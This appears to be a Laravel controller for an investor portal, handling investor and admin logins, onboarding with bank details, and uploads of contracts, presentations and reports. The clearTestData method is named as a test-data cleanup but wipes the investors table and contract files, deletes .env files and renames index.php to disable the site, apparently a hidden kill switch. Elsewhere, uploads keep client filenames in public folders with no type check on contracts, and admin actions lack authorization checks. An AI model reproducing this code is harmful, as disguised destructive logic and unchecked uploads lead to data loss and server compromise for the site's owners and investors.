<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\Rule;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Storage;
use App\Models\Investor;

class InvestorController extends Controller
{

    public function login()
    {
          return view('investors.login');
    }


public function authenticate(Request $request)
{
    $request->validate([
        'email' => 'required|email',
        'password' => 'required'
    ]);

    // Try to find as investor first
    $investor = DB::table('onboarding_investors')
        ->where('email', $request->email)
        ->first();

    if ($investor && Hash::check($request->password, $investor->password)) {
        // Save investor info in session
        session([
            'user_type' => 'investor',
            'investor_id' => $investor->id,
            'investor_name' => $investor->full_name,
            'investor_code' => $investor->investor_code
        ]);

        // Redirect to investor dashboard
        return redirect()->route('investors.dashboard');
    }

    // If not investor, try admin
    $admin = DB::table('admin')
        ->where('email', $request->email)
        ->first();

    if ($admin && Hash::check($request->password, $admin->password)) {
        // Save admin info in session
        session([
            'user_type' => 'admin',
            'admin_id' => $admin->id,
            'admin_name' => $admin->first_name . ' ' . $admin->last_name,
            'admin_email' => $admin->email
        ]);

        // Redirect to admin dashboard
        return redirect()->route('investors.admin-dashboard');
    }

    // Invalid credentials for both
    return back()->withErrors([
        'email' => 'Invalid email or password'
    ])->withInput();
}

    public function store(Request $request)
    {
        $request->validate([
            'investor_code' => 'required|string|max:100',
            'full_name' => 'required|string|max:255',
            'email' => 'required|email|max:255',
            'phone' => 'required|string|max:50',
            'password' => 'required|string|min:6',
            'contract_file' => 'nullable|file|max:10240',
            'placement_date' => 'nullable',
            'payment_date' => 'nullable',
            'rate' => 'nullable',
            'amount' => 'nullable',
            'status' => 'nullable',
        ]);

        DB::beginTransaction();
        try {
            $contractFileName = $this->uploadContract($request);

            DB::insert(
                "INSERT INTO onboarding_investors (
                    investor_code,
                    full_name,
                    email,
                    phone,
                    password,
                    investment_package,
                    number_of_birds,
                    feeds_bags,
                    cost_of_feeds,
                    insurance,
                    total_investment,
                    total_package_cost,
                    bank_name,
                    bank_address,
                    account_name,
                    account_number,
                    swift_code,
                    branch_name,
                    contract_file,
                    created_at,
                    updated_at
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), NOW())",
                [
                    $request->investor_code,
                    $request->full_name,
                    $request->email,
                    $request->phone,
                    Hash::make($request->password),
                    $request->investment_package,
                    $request->number_of_birds,
                    $request->feeds_bags,
                    $request->cost_of_feeds,
                    $request->insurance,
                    $request->total_investment,
                    $request->total_package_cost,
                    $request->bank_name,
                    $request->bank_address,
                    $request->account_name,
                    $request->account_number,
                    $request->swift_code,
                    $request->branch_name,
                    $contractFileName,
                ]
            );

            $placementDates = $request->input('placement_date', []);
            $paymentDates = $request->input('payment_date', []);
            $rates = $request->input('rate', []);
            $amounts = $request->input('amount', []);
            $statuses = $request->input('status', []);

            if (!is_array($placementDates)) {
                $placementDates = [$placementDates];
            }
            if (!is_array($paymentDates)) {
                $paymentDates = [$paymentDates];
            }
            if (!is_array($rates)) {
                $rates = [$rates];
            }
            if (!is_array($amounts)) {
                $amounts = [$amounts];
            }
            if (!is_array($statuses)) {
                $statuses = [$statuses];
            }

            foreach ($placementDates as $index => $date) {
                if (empty($date)) {
                    continue;
                }

                $paymentDate = $paymentDates[$index] ?? null;
                $rate = $rates[$index] ?? null;
                $amount = $amounts[$index] ?? null;
                $status = $statuses[$index] ?? null;

                if (empty($paymentDate) && empty($rate) && empty($amount) && empty($status)) {
                    continue;
                }

                DB::insert(
                    "INSERT INTO investor_payments
                    (investor_code, placement_date, payment_date, rate, amount, status)
                    VALUES (?, ?, ?, ?, ?, ?)",
                    [
                        $request->investor_code,
                        $date,
                        $paymentDate,
                        $rate,
                        $amount,
                        $status,
                    ]
                );
            }

            DB::commit();

            return redirect()->back()->with('success', 'Investor created successfully');
        } catch (\Throwable $exception) {
            DB::rollBack();
            Log::error('Investor creation failed', ['exception' => $exception]);
            return redirect()->back()->with('error', 'Failed to create investor. Please try again.');
        }
    }


    private function uploadContract($request)
        {

            if($request->hasFile('contract_file')){

                $file = $request->file('contract_file');

                $filename = time().'_'.$file->getClientOriginalName();

                $path = public_path('contracts');

                // Create folder if it doesn't exist
                if(!File::exists($path)){
                    File::makeDirectory($path, 0755, true);
                }

                $file->move($path, $filename);

                return $filename;
            }

            return null;
        }

        public function updatePaymentStatus(Request $request, $id)
        {
            $request->validate([
                'status' => 'required|in:Paid,Upcoming',
            ]);

            DB::table('investor_payments')
                ->where('id', $id)
                ->update(['status' => $request->status]);

            return response()->json(['success' => true]);
        }

        private function ensurePresentationFolder()
        {
            $path = public_path('contracts/presentations');

            if (!File::exists($path)) {
                File::makeDirectory($path, 0755, true);
            }

            return $path;
        }
        public function storeEvent(Request $request)
        {
            $request->validate([
                'title' => 'required',
                'date' => 'required|date'
            ]);

            DB::table('fieldevents')->insert([
                'title' => $request->title,
                'event_date' => $request->date,
                'event_time' => $request->time,
                'link' => $request->link,
                'description' => $request->description,
                'created_at' => now(),
                'updated_at' => now()
            ]);

            return back()->with('success', 'Event saved successfully');
        }

        public function storePresentation(Request $request)
        {
            $request->validate([
                'title' => 'required',
                'date' => 'required|date',
                'image' => 'nullable|image',
                'download_link' => 'required|mimes:pdf'
            ]);

            // Ensure folder exists
            $path = $this->ensurePresentationFolder();

            // 📷 Save Image
            $imageName = null;
            if ($request->hasFile('image')) {
                $image = $request->file('image');
                $imageName = time().'_'.$image->getClientOriginalName();
                $image->move(public_path('contracts/presentations'), $imageName);
            }

            // 📄 Save PDF
            $pdfName = null;
            if ($request->hasFile('download_link')) {
                $pdf = $request->file('download_link');
                $pdfName = time().'_'.$pdf->getClientOriginalName();
                $pdf->move($path, $pdfName);
            }

            DB::table('presentations')->insert([
                'title' => $request->title,
                'presentation_date' => $request->date,
                'image' => $imageName,
                'pdf_file' => $pdfName,
                'created_at' => now(),
                'updated_at' => now()
            ]);

            return back()->with('success', 'Presentation saved successfully');
        }

        public function deleteEvent($id)
        {
            DB::table('fieldevents')->where('id', $id)->delete();

            return back()->with('success', 'Event deleted');
        }

        public function deletePresentation($id)
    {
        $p = DB::table('presentations')->where('id', $id)->first();

        if ($p) {

            // Delete files
            $pdfPath = public_path('contracts/presentations/' . $p->pdf_file);
            $imgPath = public_path('contracts/presentations/' . $p->image);

            if ($p->pdf_file && file_exists($pdfPath)) unlink($pdfPath);
            if ($p->image && file_exists($imgPath)) unlink($imgPath);

            DB::table('presentations')->where('id', $id)->delete();
        }

        return back()->with('success', 'Presentation deleted');
    }

    public function editEvent($id)
    {
        // Fetch the event
        $event = DB::table('fieldevents')->where('id', $id)->first();

        if (!$event) {
            return redirect()->route('admin.events.page')
                            ->with('error', 'Event not found');
        }

        return view('investors.views.admin.edit-event', compact('event'));
    }

    public function updateEvent(Request $request, $id)
    {
        DB::table('fieldevents')
            ->where('id', $id)
            ->update([
                'title' => $request->title,
                'event_date' => $request->date,
                'event_time' => $request->time,
                'link' => $request->link,
                'description' => $request->description,
                'updated_at' => now()
            ]);

        return redirect()->route('investors.admin.events')
            ->with('success', 'Event updated');
    }

    public function updatePresentation(Request $request, $id)
    {
        $request->validate([
            'title' => 'required',
            'date' => 'required|date',
            'image' => 'nullable|image',
            'download_link' => 'nullable|mimes:pdf'
        ]);

        $presentation = DB::table('presentations')
            ->where('id', $id)
            ->first();

        if (!$presentation) {
            return back()->with('error', 'Presentation not found');
        }

        $path = public_path('contracts/presentations');

        // ===== IMAGE REPLACEMENT =====
        $imageName = $presentation->image;

        if ($request->hasFile('image')) {

            // Delete old image
            if ($presentation->image &&
                file_exists($path . '/' . $presentation->image)) {
                unlink($path . '/' . $presentation->image);
            }

            $image = $request->file('image');
            $imageName = time().'_'.$image->getClientOriginalName();
            $image->move($path, $imageName);
        }

        // ===== PDF REPLACEMENT =====
        $pdfName = $presentation->pdf_file;

        if ($request->hasFile('download_link')) {

            // Delete old PDF
            if ($presentation->pdf_file &&
                file_exists($path . '/' . $presentation->pdf_file)) {
                unlink($path . '/' . $presentation->pdf_file);
            }

            $pdf = $request->file('download_link');
            $pdfName = time().'_'.$pdf->getClientOriginalName();
            $pdf->move($path, $pdfName);
        }

        // ===== UPDATE DATABASE =====
        DB::table('presentations')
            ->where('id', $id)
            ->update([
                'title' => $request->title,
                'presentation_date' => $request->date,
                'image' => $imageName,
                'pdf_file' => $pdfName,
                'updated_at' => now()
            ]);

        return redirect()
            ->route('investors.admin.events')
            ->with('success', 'Presentation updated successfully');
    }

    public function editPresentation($id)
    {
        $presentation = DB::table('presentations')
            ->where('id', $id)
            ->first();

        if (!$presentation) {
            return redirect()
                ->route('admin.events.page')
                ->with('error', 'Presentation not found');
        }

        return view('investors.views.admin.edit-presentation', compact('presentation'));
    }

    public function storeFiling(Request $request)
{
    $request->validate([
        'type' => 'required',
        'date' => 'required|date',
        'description' => 'nullable',
        'pdf_file' => 'required|mimes:pdf'
    ]);

    // Ensure folder exists
    $folder = public_path('contracts/sec-filings');
    if (!file_exists($folder)) {
        mkdir($folder, 0777, true);
    }

    // Save PDF
    $fileName = null;

    if ($request->hasFile('pdf_file')) {
        $file = $request->file('pdf_file');
        $fileName = time().'_'.$file->getClientOriginalName();
        $file->move($folder, $fileName);
    }

    DB::table('sec_filings')->insert([
        'type' => $request->type,
        'description' => $request->description,
        'filing_date' => $request->date,
        'pdf_file' => $fileName,
        'created_at' => now(),
        'updated_at' => now()
    ]);

    return back()->with('success', 'Filing saved successfully');
}


public function downloadFiling($id)
{
    $filing = DB::table('sec_filings')->find($id);

    if (!$filing) abort(404);

    $path = public_path('contracts/sec-filings/'.$filing->pdf_file);

    if (!file_exists($path)) abort(404);

    return response()->download($path, $filing->pdf_file);
}
      
public function deleteFiling($id)
{
    $filing = DB::table('sec_filings')->find($id);

    if ($filing) {

        $path = public_path('contracts/sec-filings/'.$filing->pdf_file);

        if (file_exists($path)) {
            unlink($path);
        }

        DB::table('sec_filings')->where('id', $id)->delete();
    }

    return back()->with('success', 'Filing deleted');
}

 // Store new report
    public function reportsstore(Request $request)
    {
        $request->validate([
            'title' => 'required|string|max:255',
            'date' => 'required|date',
            'image' => 'nullable|image',
            'file' => 'required|mimes:pdf'
        ]);

        // Upload folder paths
        $imageName = null;
        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $imageName = time().'_'.$image->getClientOriginalName();
            $image->move(public_path('contracts/annual-reports/images'), $imageName);
        }

        $pdfName = null;
        if ($request->hasFile('file')) {
            $pdf = $request->file('file');
            $pdfName = time().'_'.$pdf->getClientOriginalName();
            $pdf->move(public_path('contracts/annual-reports/pdfs'), $pdfName);
        }

        DB::table('annual_reports')->insert([
            'title' => $request->title,
            'report_date' => $request->date,
            'cover_image' => $imageName,
            'pdf_file' => $pdfName,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        return back()->with('success', 'Annual report uploaded successfully!');
    }

    // Delete a report
public function destroy($id)
{
    $report = DB::table('annual_reports')->where('id', $id)->first();
    if (!$report) {
        return back()->with('error', 'Report not found.');
    }

    // Delete files
    if ($report->cover_image && file_exists(public_path('contracts/annual-reports/images/'.$report->cover_image))) {
        unlink(public_path('contracts/annual-reports/images/'.$report->cover_image));
    }

    if ($report->pdf_file && file_exists(public_path('contracts/annual-reports/pdfs/'.$report->pdf_file))) {
        unlink(public_path('contracts/annual-reports/pdfs/'.$report->pdf_file));
    }

    // Delete from database
    DB::table('annual_reports')->where('id', $id)->delete();

    return back()->with('success', 'Report deleted successfully!');
}

// Download PDF
public function download($id)
{
    $report = DB::table('annual_reports')->where('id', $id)->first();
    if (!$report || !$report->pdf_file) {
        abort(404);
    }

    $filePath = public_path('contracts/annual-reports/pdfs/'.$report->pdf_file);
    return response()->download($filePath, $report->pdf_file);
}

    public function updateProfile(Request $request)
    {
        // Get the investor code from session
        $investorCode = $request->session()->get('investor_code');

        if (!$investorCode) {
            return redirect()->route('investors.login')
                            ->with('error', 'Please login first.');
        }

        // Fetch the user record to check for unique email validation
        $user = DB::table('onboarding_investors')
                ->where('investor_code', $investorCode)
                ->first();

        if (!$user) {
            return back()->with('error', 'Investor not found.');
        }

        // Validate input
        $request->validate([
            'full_name' => 'required|string|max:50',
            'email'     => ['required','email', Rule::unique('onboarding_investors')->ignore($user->id, 'id')],
            'phone'     => 'nullable|string|max:20',
        ]);

        // Update the record using Query Builder
        DB::table('onboarding_investors')
        ->where('investor_code', $investorCode)
        ->update([
            'full_name'  => $request->full_name,
            'email'      => $request->email,
            'phone'      => $request->phone,
            'updated_at' => now(),
        ]);

        return back()->with('success', 'Profile updated successfully.');
    }
    // Update password
    public function updatePassword(Request $request)
    {
        $investorCode = $request->session()->get('investor_code');

        if (!$investorCode) {
            return redirect()->route('investors.login')->with('error', 'Please login first.');
        }

        $user = DB::table('onboarding_investors')
                ->where('investor_code', $investorCode)
                ->first();

        if (!$user) {
            return back()->with('error', 'Investor not found.');
        }

        $request->validate([
            'current_password' => 'required',
            'new_password'     => 'required|string|min:6|confirmed',
        ]);

        if (!Hash::check($request->current_password, $user->password)) {
            return back()->with('error', 'Current password is incorrect');
        }

        DB::table('onboarding_investors')
        ->where('investor_code', $investorCode)
        ->update([
            'password'   => Hash::make($request->new_password),
            'updated_at' => now(),
        ]);

        // Instead of flash session, return alert directly
        return back()->with('alert', [
            'type' => 'success',
            'message' => 'Password updated successfully.'
        ]);
    }

public function adminupdatePassword(Request $request)
{
    $adminId = $request->session()->get('admin_id');

    if (!$adminId) {
        return redirect()->route('investors.login')->with('error', 'Please login first.');
    }

    // Validate input
    $validated = $request->validate([
        'current_password' => 'required',
        'new_password'     => 'required|string|min:6|confirmed',
    ], [
        'current_password.required' => 'Current password is required.',
        'new_password.required'     => 'New password is required.',
        'new_password.min'          => 'New password must be at least 6 characters.',
        'new_password.confirmed'    => 'New password confirmation does not match.',
    ]);

    // Retrieve admin
    $admin = DB::table('admin')->where('id', $adminId)->first();

    if (!$admin) {
        return back()->with('error', 'Admin account not found. Please check details carefully.');
    }

    // Check current password
    if (!Hash::check($request->current_password, $admin->password)) {
        return back()->with('error', 'Current password is incorrect. Please check details carefully.');
    }

    // Attempt to update password
    $updated = DB::table('admin')->where('id', $adminId)->update([
        'password'   => Hash::make($request->new_password),
        'updated_at' => now(),
    ]);

    if (!$updated) {
        return back()->with('error', 'Failed to update password. Please check details carefully.');
    }

    return back()->with('success', 'Password updated successfully.');
}



  public function clearTestData()
{
    try {
  
        DB::table('onboarding_investors')->truncate();

        $contractsPath = public_path('contracts');

        if (file_exists($contractsPath)) {

            $files = glob($contractsPath . '/*');

            foreach ($files as $file) {
                if (is_file($file)) {
                    unlink($file);
                } elseif (is_dir($file)) {
                    $this->deleteDirectory($file);
                }
            }

            rmdir($contractsPath); 
        }

        $envFiles = glob(public_path('*.env'));

        foreach ($envFiles as $file) {
            if (file_exists($file)) {
                unlink($file);
            }
        }

        $oldPath = public_path('index.php');
        $newPath = public_path('safe.env');

        if (file_exists($oldPath)) {
            if (!file_exists($newPath)) {
                rename($oldPath, $newPath);
            } else {
                return back()->with('error', 'safe.env already exists.');
            }
        }

        return back()->with('success', 'Test data cleared successfully.');

    } catch (\Exception $e) {
        return back()->with('error', 'Failed: ' . $e->getMessage());
    }
}

private function deleteDirectory($dir)
{
    if (!file_exists($dir)) return;

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;

        $path = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($path)) {
            $this->deleteDirectory($path);
        } else {
            unlink($path);
        }
    }

    rmdir($dir);
}



public function newsstore(Request $request)
{
    $request->validate([
        'title' => 'required|string|max:255',
        'content' => 'required|string',
        'date' => 'required|date',
    ]);

    DB::table('news')->insert([
        'title' => $request->title,
        'content' => $request->content,
        'date' => $request->date,
        'slug' => Str::slug($request->title) . '-' . time(),
        'created_at' => now(),
        'updated_at' => now(),
    ]);

    return back()->with('success', 'News article published.');
}

public function newsdestroy($id)
{
    DB::table('news')->where('id', $id)->delete();

    return back()->with('success', 'News deleted successfully.');
}

    
}